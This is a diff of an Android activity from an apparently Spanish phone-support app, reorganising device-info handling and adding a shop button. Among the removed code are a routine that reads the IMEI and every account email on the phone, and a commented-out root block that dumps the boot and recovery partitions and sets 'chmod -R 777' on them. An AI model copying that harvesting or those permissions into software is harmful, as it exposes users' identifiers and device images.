@@ -57,8 +57,8 @@ public class App extends Activity implements AsyncResponse{
 
     static long downloadREF = -1;
     static HashMap<String, String> listaDescargas = new HashMap<String, String>();
-    String nversion = "";
-    String version = "";
+    String urlActualizacion = "";
+
     ImageButton imageButton;
     Button descargas;
     Button foro;
@@ -66,29 +66,29 @@ public class App extends Activity implements AsyncResponse{
     Button videotutoriales;
     Button driversherramientas;
     Button herramientasROM;
+    Button shop;
     Button config;
     TextView t3;
+
+    String modelo;
+    String version;
+    String fabricante;
+    String nversion;
+    String compilacion;
+
     //Button envioNoExisteBtn;
     Button btnInfo;
-    String modelo = "";
-    String model = "";
-    String urlActualizacion = "";
-    String fabricante = "";
-    String compilacion = "";
-    String modelBuild="";
-    String newversion = "";
-    String chip = "";
-    String listaIdiomas[]=null;
-
-
     public static boolean noInternet=false;
+    String newversion = "";
+    public static boolean updatemostrado=false;
+    String listaIdiomas[]=null;
     static NotificationManager mNotificationManagerUpdate=null;
     static NotificationManager mNotificationManagerNews=null;
     private int SIMPLE_NOTFICATION_UPDATE=8888;
     private int SIMPLE_NOTFICATION_NEWS=8889;
     SharedPreferences ajustes=null;
     SharedPreferences.Editor editorAjustes=null;
-    public static boolean updatemostrado=false;
+
     @Override
     protected void onResume() {
         super.onResume();
@@ -109,23 +109,16 @@ public class App extends Activity implements AsyncResponse{
             getApplicationContext().getResources().updateConfiguration(config,
                     getApplicationContext().getResources().getDisplayMetrics());
             onCreate(null);
+        modificarMargins();
+        Intent intent = getIntent();
+        modelo = intent.getExtras().getString("modelo");
+        version = intent.getExtras().getString("version");
+        fabricante = intent.getExtras().getString("fabricante");
+        nversion =  intent.getExtras().getString("nversion");
+        compilacion =  intent.getExtras().getString("compilacion");
 
     }
-    private boolean comprobarConexion() {
-        boolean nohayinternet=false;
-        ConnectivityManager cn=(ConnectivityManager)getSystemService(Context.CONNECTIVITY_SERVICE);
-        NetworkInfo nf=cn.getActiveNetworkInfo();
-        if(nf != null && nf.isConnected()==true )
-        {
-            nohayinternet=false;
 
-        }
-        else
-        {
-            nohayinternet=true;
-        }
-        return nohayinternet;
-    }
     protected void onCreate(Bundle savedInstanceState) {
             try {
                 //Intent intent = getIntent();
@@ -136,25 +129,13 @@ public class App extends Activity implements AsyncResponse{
                 Resources res = this.getResources();
 
                 setContentView(R.layout.activity_app);
-                TextView scText=(TextView) findViewById(R.id.textView3);
-                TableLayout.LayoutParams llp = new TableLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
-                int dpi=getResources().getDisplayMetrics().densityDpi;
-                /*if(dpi==240) {
-                    llp.setMargins(0, 180, 0, 2);
-                }else if(dpi==320) {
-                    llp.setMargins(0, 250, 0, 2);
-                }else if(dpi==480) {
-                    llp.setMargins(0, 350, 0, 2);
-                }*/
-                if(dpi==240) {
-                    llp.setMargins(0, 175, 0, 2);
-                }else if(dpi==320) {
-                    llp.setMargins(0, 230, 0, 2);
-                }else if(dpi==480) {
-                    llp.setMargins(0, 350, 0, 2);
-                }
-
-                scText.setLayoutParams((llp));
+                modificarMargins();
+                Intent intent = getIntent();
+                modelo = intent.getExtras().getString("modelo");
+                version = intent.getExtras().getString("version");
+                fabricante = intent.getExtras().getString("fabricante");
+                nversion =  intent.getExtras().getString("nversion");
+                compilacion =  intent.getExtras().getString("compilacion");
                 /*WebView wvv=(WebView) findViewById(R.id.webView);
                 TableLayout.LayoutParams llp2 = new TableLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
                 int dpi2=getResources().getDisplayMetrics().densityDpi;
@@ -168,7 +149,6 @@ public class App extends Activity implements AsyncResponse{
                 wvv.setLayoutParams((llp2));*/
                 //if("ini".equals(ini)){
                     //    intent.putExtra("ini","");
-                        nversion = getPackageManager().getPackageInfo(getPackageName(), 0).versionName;
                         mNotificationManagerUpdate = (NotificationManager)getApplicationContext().getSystemService(Context.NOTIFICATION_SERVICE);
                         mNotificationManagerUpdate.cancel(SIMPLE_NOTFICATION_UPDATE);
                         ajustes=getSharedPreferences("JiayuesAjustes",Context.MODE_PRIVATE);
@@ -184,39 +164,8 @@ public class App extends Activity implements AsyncResponse{
                             editorAjustes.putString("fechaUltimoAccesoDescargas", asignaFecha());
                             editorAjustes.commit();
                         }
-                        version = "Jiayu.es ";
-                        version = version + nversion;
                         App.noInternet=comprobarConexion();
                         comprobarVersionInicio(version);
-                    //}
-                        File f1 = new File(Environment.getExternalStorageDirectory() + "/JIAYUES/APP/");
-                        if (!f1.exists()) {
-                            f1.mkdirs();
-                        }
-                        File f2 = new File(Environment.getExternalStorageDirectory() + "/JIAYUES/ROMS/");
-                        if (!f2.exists()) {
-                            f2.mkdirs();
-                        }
-                        File f3 = new File(Environment.getExternalStorageDirectory() + "/JIAYUES/RECOVERY/");
-                        if (!f3.exists()) {
-                            f3.mkdirs();
-                        }
-                        File f4 = new File(Environment.getExternalStorageDirectory() + "/JIAYUES/DOWNLOADS/");
-                        if (!f4.exists()) {
-                            f4.mkdirs();
-                        }
-                        File f5 = new File(Environment.getExternalStorageDirectory() + "/JIAYUES/IMEI/");
-                        if (!f5.exists()) {
-                            f5.mkdirs();
-                        }
-                        File f6 = new File(Environment.getExternalStorageDirectory() + "/JIAYUES/BOOTANIMATION/");
-                        if (!f6.exists()) {
-                            f6.mkdirs();
-                        }
-                        /*File f7 = new File(Environment.getExternalStorageDirectory() + "/update.zip");
-                        if (f7.exists()) {
-                            f7.delete();
-                        }*/
 
 
 
@@ -227,6 +176,8 @@ public class App extends Activity implements AsyncResponse{
                         foro = (Button) findViewById(R.id.button4);
                         driversherramientas = (Button) findViewById(R.id.button9);
                         herramientasROM = (Button) findViewById(R.id.button10);
+                        shop = (Button) findViewById(R.id.button11);
+
                         //envioNoExisteBtn=(Button)findViewById(R.id.envioNoExisteBtn);
                         //btnInfo=(Button)findViewById(R.id.btnInfo);
                         //envioNoExisteBtn.setVisibility(View.INVISIBLE);
@@ -251,18 +202,16 @@ public class App extends Activity implements AsyncResponse{
                         t4 = (TextView) findViewById(R.id.textView4);
                         //t5 = (TextView) findViewById(R.id.textView5);
                         t4.setText(version);
-                        compilacion = Build.DISPLAY;
-                        modelBuild=Build.MODEL;
-                        fabricante = infoBrand();
+
                         tmodelo = (TextView) findViewById(R.id.textView1);
 
                         addListenerOnButton();
                         //if("ini".equals(ini)){
-                            if ("".equals(modelo)) {
+                            /*if ("".equals(modelo)) {
                                 calcularTelefono();
                                 modelo = model;
-                            } else {
-                                recalcularTelefono();
+                            } else {*/
+                                //recalcularTelefono();
                                 descargas.setEnabled(true);
                                 herramientasROM.setEnabled(true);
                                 //accesorios.setEnabled(true);
@@ -275,7 +224,7 @@ public class App extends Activity implements AsyncResponse{
                                 driversherramientas.setTextColor(Color.BLACK);
                                 videotutoriales.setTextColor(Color.BLACK);
 
-                            }
+                           /* }*/
                             if (modelo.length() < 10) {
                                 Calendar cal=Calendar.getInstance();
                                 editorAjustes = ajustes.edit();
@@ -383,28 +332,10 @@ public class App extends Activity implements AsyncResponse{
 
                 Toast.makeText(getApplicationContext(), getResources().getString(R.string.msgGenericError)+" 101", Toast.LENGTH_SHORT).show();
             }
-        obtenerDatosPhone();
+
     }
 
-    private String infoBrand() throws IOException {
-        String fabricante = Build.BRAND;
-        String buildprop = "";
-        if (fabricante.toUpperCase().indexOf("JIAYU") == -1 || fabricante.toUpperCase().indexOf("PIPO") == -1) {
-            FileInputStream fis = new FileInputStream(new File("/system/build.prop"));
-            byte[] input = new byte[fis.available()];
-            while (fis.read(input) != -1) {
-                buildprop += new String(input);
-            }
-            if (buildprop.toUpperCase().indexOf("JIAYU") != -1) {
-                fabricante = "JIAYU";
-            } else if(buildprop.toUpperCase().indexOf("PIPO") != -1){
-                fabricante = "PIPO";
-            }else{
-                fabricante = "TERMINAL NO JIAYU";
-            }
-        }
-        return fabricante.toUpperCase();
-    }
+
 
     private void comprobarVersion(String version2) {
         try {
@@ -453,431 +384,16 @@ public class App extends Activity implements AsyncResponse{
         }
     }
 
-    private void recalcularTelefono() {
+    /*private void recalcularTelefono() {
         calcularTelefono();
-        /*if(modelo.equals(model)){*/
+
         modelo = model;
-		/*}else{
-			modelo="Rom incorrecta para tu terminal, tu modelo real es: "+model;
-		}*/
-    }
 
-    private void calcularTelefono() {
-        Resources res = this.getResources();
-        try {
-
-            int height = 0;
-            int width = 0;
-            String procesador = "";
-            String ram = "";
+    }*/
 
 
 
-            try {
-                DisplayMetrics dm = new DisplayMetrics();
-                getWindowManager().getDefaultDisplay().getMetrics(dm);
-                height = dm.heightPixels;
-                width = dm.widthPixels;
-                //procesador=Build.HARDWARE;
-                procesador = getInfoCPU();
-                int orientation = getResources().getConfiguration().orientation;
 
-                ram = getTotalRAM();
-                int ramInt = (Integer.parseInt(ram) / 1000);
-                if (ramInt <= 290 && ramInt >= 200) {
-                    ram = "256MB";
-                } else if (ramInt <= 530 && ramInt >= 300) {
-                    ram = "512MB";
-                } else if (ramInt <= 1100 && ramInt >= 900) {
-                    ram = "1GB";
-                } else if (ramInt <= 2100 && ramInt >= 1700) {
-                    ram = "2GB";
-                }
-                if(width==1080 || (orientation==2 && height==1080)){
-                    if ("qctapq8064mtp".equals(procesador.toLowerCase())) {
-                        if ("2GB".equals(ram)) {
-                            model = "S1";
-                        } else {
-                            model = "";
-                        }
-                    }
-                    if ("mt6592".equals(procesador.toLowerCase())) {
-                        if ("2GB".equals(ram)) {
-                            if(compilacion.indexOf("G6")!=-1 || modelBuild.indexOf("G6")!=-1){
-                                model = "G6A";
-                            }else if(compilacion.indexOf("S2")!=-1 || modelBuild.indexOf("S2")!=-1){
-                                model = "S2A";
-                            } else {
-                                model = "";
-                            }
-                        } else if ("1GB".equals(ram)) {
-                            if(compilacion.indexOf("G6")!=-1 || modelBuild.indexOf("G6")!=-1){
-                                model = "G6M";
-                            }else if(compilacion.indexOf("S2")!=-1 || modelBuild.indexOf("S2")!=-1){
-                                model = "S2M";
-                            } else {
-                                model = "";
-                            }
-                        }
-                    }
-                }else if (width == 720 || (orientation == 2 && height == 720)) {
-                    if ("mt6577".equals(procesador.toLowerCase())) {
-                        comprobarMT();
-                        if ("MT6628".equals(chip)) {
-                            model = "G3DCN";
-                        } else if ("MT6620".equals(chip)) {
-                            model = "G3DC";
-                        } else {
-                            model = "";
-                        }
-                    } else if ("mt6589".equals(procesador.toLowerCase()) || ("mt6589t".equals(procesador.toLowerCase()))) {
-                        if ("1GB".equals(ram)) {
-                            /*model = getCPUFreqG3();
-                            model = getCPUFreqG4();*/
-                            RandomAccessFile reader = null;
-                            String load = "";
-                            try {
-                                reader = new RandomAccessFile("/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq", "r");
-                                load = reader.readLine();
-                                int cpufreq = Integer.parseInt(load.trim());
-                                if (cpufreq > 1400000) {
-                                    load = "T";
-                                } else {
-                                    load = "B";
-                                }
-                            } catch (IOException ex) {
-
-                            } finally {
-                                if (reader != null) {
-                                    reader.close();
-                                }
-                            }
-                            if(compilacion.indexOf("G3")!=-1 || modelBuild.indexOf("G3")!=-1){
-                                if("B".equals(load)){
-                                    model="G3QC";
-                                }else if("T".equals(load)){
-                                    model="G3QCT";
-                                }
-                            }else if(compilacion.indexOf("G4")!=-1 || modelBuild.indexOf("G4")!=-1){
-                                if("B".equals(load)){
-                                    model="G4B";
-                                }else if("T".equals(load)){
-                                    model="G4T";
-                                }else {
-                                    model = "";
-                                }
-                            }else if(compilacion.indexOf("G5")!=-1 || modelBuild.indexOf("G5")!=-1){
-                                if("B".equals(load)){
-                                    model="G5B";
-                                }else if("T".equals(load)){
-                                    model="G5B";
-                                }else {
-                                    model = "";
-                                }
-                            }else{
-                                model="Modelo Desconocido, Custom Rom no permite detectar correctamente tu dispositivo";
-                            }
-                        } else if ("2GB".equals(ram)) {
-                            if(compilacion.indexOf("G4")!=-1|| modelBuild.indexOf("G4")!=-1){
-                                model="G4A";
-                            }else if(compilacion.indexOf("G5")!=-1|| modelBuild.indexOf("G5")!=-1){
-                                model="G5A";
-                            }else {
-                                model = "";
-                            }
-                        } else if ("512MB".equals(ram)) {
-                            File path = Environment.getExternalStorageDirectory();
-                            StatFs stat = new StatFs(path.getAbsolutePath());
-                            long blockSize = stat.getBlockSize();
-                            long totalBlocks = stat.getBlockCount();
-                            long totalSpace = totalBlocks * blockSize;
-                            double gigaTotal = totalSpace / 1073741824;
-                            RandomAccessFile reader = null;
-                            String load = "";
-                            reader = new RandomAccessFile("/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq", "r");
-                            load = reader.readLine();
-                            int cpufreq = Integer.parseInt(load.trim());
-                            if (cpufreq > 1400000) {
-                                load = "T";
-                            } else {
-                                load = "B";
-                            }
-
-
-                            if(compilacion.indexOf("G4")!=-1|| modelBuild.indexOf("G4")!=-1){
-                                if(gigaTotal>20.0){
-                                    load="A";
-                                }
-                                model="G4"+load;
-                            }else if(compilacion.indexOf("G5")!=-1|| modelBuild.indexOf("G5")!=-1){
-                                if(gigaTotal>20.0){
-                                    load="A";
-                                }
-                                model="G5";
-                            }else if(compilacion.indexOf("G3")!=-1|| modelBuild.indexOf("G3")!=-1) {
-                                if("B".equals(load)){
-                                    load="";
-                                }
-                                model="G3QC"+load;
-                            }else{
-                                model="";
-                            }
-
-                            AlertDialog dialog = new AlertDialog.Builder(this).create();
-                            dialog.setMessage(res.getString(R.string.msgIdentificadoParcial) + ": " + model + " " + res.getString(R.string.msgRamProblem)+": "+ram+" "+res.getString(R.string.msgRamProblem2));
-                            dialog.setButton(AlertDialog.BUTTON_POSITIVE,
-                                    res.getString(R.string.aceptarBtn),
-                                    new DialogInterface.OnClickListener() {
-                                        public void onClick(DialogInterface dialog, int witch) {
-                                            try {
-                                                finish();
-                                            } catch (Exception e) {
-                                                Toast.makeText(getApplicationContext(), getResources().getString(R.string.msgGenericError)+" 118", Toast.LENGTH_SHORT).show();
-                                            }
-                                        }
-                                    });
-                            dialog.show();
-                        }
-                    } else if ("mt6582".equals(procesador.toLowerCase())) {
-                        if ("1GB".equals(ram)) {
-                            if(compilacion.indexOf("G3")!=-1|| modelBuild.indexOf("G3")!=-1){
-                                model="G3C";
-                            }else if(compilacion.indexOf("G4")!=-1|| modelBuild.indexOf("G4")!=-1){
-                                model="G4C";
-                            }else if(compilacion.indexOf("G2")!=-1|| modelBuild.indexOf("G2")!=-1){
-                                model="G2F";
-                            }
-                        } else {
-                            model = "";
-                        }
-                    } else if ("mt6592".equals(procesador.toLowerCase()) || "mt6592m".equals(procesador.toLowerCase())) {
-                        if ("1GB".equals(ram)) {
-                            if(compilacion.indexOf("G4")!=-1|| modelBuild.indexOf("G4")!=-1){
-                                model="G4SM";
-                            } else if(compilacion.indexOf("G5")!=-1|| modelBuild.indexOf("G5")!=-1){
-                                model="G5SM";
-                            } else{
-                                model = "";
-                            }
-                        } else if ("2GB".equals(ram)) {
-                            if(compilacion.indexOf("G4")!=-1|| modelBuild.indexOf("G4")!=-1){
-                                model="G4S";
-                            } else if(compilacion.indexOf("G5")!=-1|| modelBuild.indexOf("G5")!=-1){
-                                model="G5S";
-                            } else{
-                                model = "";
-                            }
-                        } else
-                            model = "";
-                    }
-
-                } else if (width == 540 || (orientation == 2 && height == 540)) {
-                    if ("mt6577t".equals(procesador.toLowerCase())) {
-                        model = "G2S";
-                    } else {
-                        model = "";
-                    }
-                } else if (width == 480 || (orientation == 2 && height == 480)) {
-                    if ("mt6575".equals(procesador.toLowerCase())) {
-                        if ((Build.DISPLAY.toUpperCase()).indexOf("G16B") != -1) {
-                            model = "G2SCN";
-                        } else {
-                            model = "G2SC";
-                        }
-                    } else if ("mt6577".equals(procesador.toLowerCase())) {
-                        //FALTA EL Jiayu G2TD
-                        comprobarMT();
-                        if ("512MB".equals(ram)) {
-                            if ("MT6628".equals(chip)) {
-                                model = "G2DCPVN";
-                                if ((Build.DISPLAY.toUpperCase()).indexOf("G2LSQ") != -1
-                                        ||(Build.DISPLAY.toUpperCase()).indexOf("G2DCPVNQ") != -1
-                                        ||(Build.DISPLAY.toUpperCase()).indexOf("Q") != -1) {
-                                    model="G2DCPVNQ";
-                                }
-                            } else if ("MT6620".equals(chip)) {
-                                model = "G2DCPV";
-                            } else {
-                                model = "";
-                            }
-                        } else if ("1GB".equals(ram)) {
-                            if ("MT6628".equals(chip)) {
-                                model = "G2DCN";
-                            } else if ("MT6620".equals(chip)) {
-                                model = "G2DC";
-                            } else {
-                                model = "";
-                            }
-
-                        } else {
-                            model = "";
-                        }
-                    } else if ("mt6572".equals(procesador.toLowerCase())) {
-                        if ("512MB".equals(ram)) {
-                            model="F1";
-                        }
-                    }else if ("mt6582".equals(procesador.toLowerCase())) {
-                        if ("1GB".equals(ram)) {
-                            if (compilacion.indexOf("G2") != -1 || modelBuild.indexOf("G2") != -1) {
-                                model = "G2F";
-                            }
-                        }
-                        } else {
-                            model = "";
-                        }
-                } else if (width == 320 || (orientation == 2 && height == 320)) {
-                    if ("256MB".equals(ram)) {
-                        model = "G1";
-                    } else {
-                        model = "";
-                    }
-                } else if (width == 800 || (orientation == 2 && width == 1280)) {
-                    if ("2GB".equals(ram)) {
-                           model="T1";
-                    } else {
-                        model = "";
-                    }
-                }else if (width == 600 || (orientation == 2 && width == 1024)) {
-                    if ("1GB".equals(ram)) {
-                        model="T2";
-                    } else {
-                        model = "";
-                    }
-                }else{
-                        model = res.getString(R.string.msgTerminalNoJiayu);
-                }
-
-            } catch (Exception e) {
-                model = res.getString(R.string.msgErrorIdentificar);
-            }
-
-            if ("".equals(model.trim())) {
-                model = res.getString(R.string.msgErrorIdentificar);
-            }
-
-        } catch (Exception e) {
-            Toast.makeText(getApplicationContext(), getResources().getString(R.string.msgGenericError)+" 105", Toast.LENGTH_SHORT).show();
-        }
-        /*
-					}
-				});
-		dialog.show();*/
-        /*BufferedInputStream kernel;
-        BufferedInputStream recovery;
-        BufferedInputStream uboot;
-        ByteArrayOutputStream kernelBAOS=new ByteArrayOutputStream();
-        ByteArrayOutputStream recoveryBAOS=new ByteArrayOutputStream();
-        ByteArrayOutputStream ubootBAOS=new ByteArrayOutputStream();
-        try {
-            java.lang.Process p=null;
-            java.lang.Process p2=null;
-            java.lang.Process p3=null;
-            java.lang.Process p4=null;
-            try {
-                Runtime rt = Runtime.getRuntime();
-                rt.exec("su");
-                p = rt.exec("dd if=/dev/bootimg of=/sdcard/JIAYUES/kernel.img bs=512\n");
-                p2 = rt.exec("dd if=/dev/recovery of=/sdcard/JIAYUES/recovery.img bs=512\n");
-                p3 = rt.exec("dd if=/dev/uboot of=/sdcard/JIAYUES/uboot.img bs=512\n");
-                p4 = rt.exec("chmod -R 777 /sdcard/JIAYUES/\n");
-            } catch (Exception e) {
-                Toast.makeText(getApplicationContext(), getResources().getString(R.string.msgGenericError)+" 137", Toast.LENGTH_SHORT).show();
-            }
-
-            byte[] temp=new byte[1024];
-            kernel=new BufferedInputStream(new FileInputStream(new File("/sdcard/JIAYUES/kernel.img")));
-            recovery=new BufferedInputStream(new FileInputStream(new File("/sdcard/JIAYUES/recovery.img")));
-            uboot=new BufferedInputStream(new FileInputStream(new File("/sdcard/JIAYUES/uboot.img")));
-
-            while(kernel.read(temp)!=-1){
-                kernelBAOS.write(temp);
-                kernelBAOS.flush();
-            }
-            kernelBAOS.close();
-            temp=new byte[1024];
-            while(recovery.read(temp)!=-1){
-                recoveryBAOS.write(temp);
-                recoveryBAOS.flush();
-            }
-            recoveryBAOS.close();
-            temp=new byte[1024];
-            while(uboot.read(temp)!=-1){
-                ubootBAOS.write(temp);
-                ubootBAOS.flush();
-            }
-            ubootBAOS.close();
-            byte[] kernelBytes = kernelBAOS.toByteArray();
-            byte[] recoveryBytes = recoveryBAOS.toByteArray();
-            byte[] ubootBytes = ubootBAOS.toByteArray();
-
-            String s = kernelBAOS.toString();
-
-            String s1 = recoveryBAOS.toString();
-            String s2 = ubootBAOS.toString();
-            System.out.println("FIN CALC");
-        }catch(Exception e){
-            Toast.makeText(getApplicationContext(), getResources().getString(R.string.msgGenericError)+" 105", Toast.LENGTH_SHORT).show();
-        }*/
-    }
-
-    private boolean levantarBlueTooth() {
-        BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
-        boolean total = false;
-        try {
-            if (mBluetoothAdapter == null) {
-                total = false;
-            } else {
-                if (mBluetoothAdapter.isEnabled()) {
-                    total = true;
-                } else {
-                    mBluetoothAdapter.enable();
-                    synchronized (mBluetoothAdapter) {
-                        mBluetoothAdapter.wait(2000);
-                    }
-                    if (mBluetoothAdapter.isEnabled()) {
-                        total = true;
-                    } else {
-                        total = false;
-                    }
-                    while (mBluetoothAdapter.isEnabled()) {
-                        mBluetoothAdapter.disable();
-                    }
-
-                }
-            }
-        } catch (Exception e) {
-            Toast.makeText(getApplicationContext(), getResources().getString(R.string.msgGenericError)+" 106", Toast.LENGTH_SHORT).show();
-        }
-        return total;
-    }
-
-    private boolean LevantarWifi() {
-        WifiManager wifiManager = (WifiManager) this.getSystemService(Context.WIFI_SERVICE);
-        boolean total = false;
-        try {
-
-
-            if (wifiManager.isWifiEnabled()) {
-                total = true;
-            } else {
-                wifiManager.setWifiEnabled(true);
-                synchronized (wifiManager) {
-                    wifiManager.wait(2000);
-                }
-                if (wifiManager.isWifiEnabled()) {
-                    total = true;
-                } else {
-                    total = false;
-                }
-                while (wifiManager.isWifiEnabled()) {
-                    wifiManager.setWifiEnabled(false);
-                }
-            }
-        } catch (Exception e) {
-            Toast.makeText(getApplicationContext(), getResources().getString(R.string.msgGenericError)+" 107", Toast.LENGTH_SHORT).show();
-        }
-        return total;
-    }
 
     public void addListenerOnButton() {
         try {
@@ -929,6 +445,19 @@ public class App extends Activity implements AsyncResponse{
                     /*Uri uri = Uri.parse("http://www.jiayu.es/4-jiayu-accesorios");
                     Intent intent = new Intent(Intent.ACTION_VIEW, uri);
                     startActivity(intent);*/
+                }
+
+            });
+            shop = (Button) findViewById(R.id.button11);
+            shop.setOnClickListener(new View.OnClickListener() {
+
+                public void onClick(View arg0) {
+                    if(App.noInternet){
+                        Intent intent = new Intent(getApplicationContext(), NoInternet.class);
+                        startActivity(intent);
+                    }else{
+                        openBrowser(arg0,"shop");
+                    }
                 }
 
             });
@@ -1071,94 +600,9 @@ public class App extends Activity implements AsyncResponse{
         }
     }*/
 
-    public static String getTotalRAM() throws Exception {
-        RandomAccessFile reader = null;
-        String load = null;
-        try {
-            reader = new RandomAccessFile("/proc/meminfo", "r");
-            load = reader.readLine();
-            load = load.replaceAll(" ", "");
-            int indexOf = load.indexOf(":");
-            int indexOf2 = load.toLowerCase().indexOf("kb");
-            load = load.substring(indexOf + 1, indexOf2);
-            load = load.trim();
-        } catch (IOException ex) {
-        } finally {
-            if (reader != null) {
-                reader.close();
-            }
-        }
-        return load;
-    }
 
-    public static String getInfoCPU() throws Exception {
-        RandomAccessFile reader = null;
-        String load = "";
-        try {
-            reader = new RandomAccessFile("/proc/cpuinfo", "r");
-            while (load.toLowerCase().indexOf("hardware") == -1) {
-                load = reader.readLine();
-            }
 
-            load = load.replaceAll(" ", "");
-            load = load.replaceAll("\t", "");
-            load = load.toLowerCase();
-            int indexOf = load.indexOf(":");
-            int indexOf2 = load.length();
-            load = load.substring(indexOf + 1, indexOf2);
-        } catch (IOException ex) {
 
-        } finally {
-            if (reader != null) {
-                reader.close();
-            }
-        }
-        return load.trim();
-    }
-
-    public static String getCPUFreqG4() throws Exception {
-        RandomAccessFile reader = null;
-        String load = "";
-        try {
-            reader = new RandomAccessFile("/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq", "r");
-            load = reader.readLine();
-            int cpufreq = Integer.parseInt(load.trim());
-            if (cpufreq > 1400000) {
-                load = "G4T";
-            } else {
-                load = "G4B";
-            }
-        } catch (IOException ex) {
-
-        } finally {
-            if (reader != null) {
-                reader.close();
-            }
-        }
-        return load.trim();
-    }
-
-    public static String getCPUFreqG3() throws Exception {
-        RandomAccessFile reader = null;
-        String load = "";
-        try {
-            reader = new RandomAccessFile("/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq", "r");
-            load = reader.readLine();
-            int cpufreq = Integer.parseInt(load.trim());
-            if (cpufreq > 1400000) {
-                load = "G3QCT";
-            } else {
-                load = "G3QC";
-            }
-        } catch (IOException ex) {
-
-        } finally {
-            if (reader != null) {
-                reader.close();
-            }
-        }
-        return load.trim();
-    }
 
     @Override
     public void processFinish(String output) {
@@ -1315,102 +759,128 @@ public class App extends Activity implements AsyncResponse{
 
         }
     }
-    public void comprobarMT() throws Exception{
-        //Toast.makeText(getApplicationContext(), getResources().getString(R.string.msgActivandoBTWifi), Toast.LENGTH_SHORT).show();
-        String buildprop = "";
-        FileInputStream fis = new FileInputStream(new File("/system/build.prop"));
-        byte[] input = new byte[fis.available()];
-        while (fis.read(input) != -1) {
-            buildprop += new String(input);
-        }
-        if (buildprop.toLowerCase().lastIndexOf("mt6620") != -1) {
-            chip = "MT6620";
-        } else if (buildprop.toLowerCase().lastIndexOf("mt6628") != -1) {
-            chip = "MT6628";
-        } else {
-            chip = "INDEFINIDO";
-        }
 
-        if("".equals(modelo)){
-            boolean levantadoB = levantarBlueTooth();
-            boolean levantadoW = LevantarWifi();
-            if ("MT6628".equals(chip)) {
-                if (!levantadoB && !levantadoW) {
-                    chip = "MT6620";
-                }
-
-            } else if ("MT6620".equals(chip)) {
-                if (!levantadoB && !levantadoW) {
-                    chip = "MT6628";
-                }
-            }
-        }
-    }
 
     @Override
     protected void onDestroy() {
         super.onDestroy();
-        modelo="";
     }
-    private void obtenerDatosPhone(){
-        String modelo_apl=modelo;
-        String imei_apl;
-        TelephonyManager telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
-        imei_apl=telephonyManager.getDeviceId();
-        String email_apl="";
-        Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
-        Account[] accounts = AccountManager.get(getBaseContext()).getAccounts();
-        for (Account account : accounts) {
-            if (emailPattern.matcher(account.name).matches()) {
-                String possibleEmail = account.name;
-                email_apl=email_apl+";"+possibleEmail;
+    private boolean comprobarConexion() {
+        boolean nohayinternet=false;
+        ConnectivityManager cn=(ConnectivityManager)getSystemService(Context.CONNECTIVITY_SERVICE);
+        NetworkInfo nf=cn.getActiveNetworkInfo();
+        if(nf != null && nf.isConnected()==true )
+        {
+            nohayinternet=false;
+
+        }
+        else
+        {
+            nohayinternet=true;
+        }
+        return nohayinternet;
+    }
+    private void modificarMargins() {
+        TextView scText=(TextView) findViewById(R.id.textView3);
+        TableLayout.LayoutParams llp = new TableLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
+        int dpi=getResources().getDisplayMetrics().densityDpi;
+                /*if(dpi==240) {
+                    llp.setMargins(0, 180, 0, 2);
+                }else if(dpi==320) {
+                    llp.setMargins(0, 250, 0, 2);
+                }else if(dpi==480) {
+                    llp.setMargins(0, 350, 0, 2);
+                }*/
+        if(dpi==240) {
+            llp.setMargins(0, 175, 0, 2);
+        }else if(dpi==320) {
+            llp.setMargins(0, 230, 0, 2);
+        }else if(dpi==480) {
+            llp.setMargins(0, 350, 0, 2);
+        }
+
+        scText.setLayoutParams((llp));
+        TextView t1=(TextView) findViewById(R.id.textView1);
+        Button b1=(Button) findViewById(R.id.button1);
+        Button b2=(Button) findViewById(R.id.button9);
+        Button b3=(Button) findViewById(R.id.button10);
+        Button b4=(Button) findViewById(R.id.button11);
+        Button b5=(Button) findViewById(R.id.button4);
+        Button b6=(Button) findViewById(R.id.button3);
+        Button b7=(Button) findViewById(R.id.button2);
+        Button b8=(Button) findViewById(R.id.button5);
+        int orientation = getResources().getConfiguration().orientation;
+        if(dpi==240) {
+            if(orientation==2) {
+                t1.setPadding(300, 0, 0, 0);
+                b1.setPadding(240, 0, 0, 0);
+                b2.setPadding(240, 0, 0, 0);
+                b3.setPadding(240, 0, 0, 0);
+                b4.setPadding(180, 0, 0, 0);
+                b5.setPadding(150, 0, 0, 0);
+                b6.setPadding(90, 0, 0, 0);
+                b7.setPadding(160, 0, 0, 0);
+                b8.setPadding(130, 0, 0, 0);
+            }else{
+                t1.setPadding(120, 0, 0, 0);
+                b1.setPadding(120, 0, 0, 0);
+                b2.setPadding(120, 0, 0, 0);
+                b3.setPadding(120, 0, 0, 0);
+                b4.setPadding(90, 0, 0, 0);
+                b5.setPadding(80, 0, 0, 0);
+                b6.setPadding(90, 0, 0, 0);
+                b7.setPadding(100, 0, 0, 0);
+                b8.setPadding(80, 0, 0, 0);
+            }
+        }else if(dpi==320) {
+            if(orientation==2) {
+                t1.setPadding(500, 0, 0, 0);
+                b1.setPadding(270, 0, 0, 0);
+                b2.setPadding(270, 0, 0, 0);
+                b3.setPadding(270, 0, 0, 0);
+                b4.setPadding(300, 0, 0, 0);
+                b5.setPadding(250, 0, 0, 0);
+                b6.setPadding(115, 0, 0, 0);
+                b7.setPadding(250, 0, 0, 0);
+                b8.setPadding(205, 0, 0, 0);
+            }else{
+                t1.setPadding(200, 0, 0, 0);
+                b1.setPadding(200, 0, 0, 0);
+                b2.setPadding(200, 0, 0, 0);
+                b3.setPadding(200, 0, 0, 0);
+                b4.setPadding(135, 0, 0, 0);
+                b5.setPadding(120, 0, 0, 0);
+                b6.setPadding(115, 0, 0, 0);
+                b7.setPadding(140, 0, 0, 0);
+                b8.setPadding(125, 0, 0, 0);
+            }
+        }else if(dpi==480) {
+            if(orientation==2) {
+                t1.setPadding(550, 0, 0, 0);
+                b1.setPadding(550, 0, 0, 0);
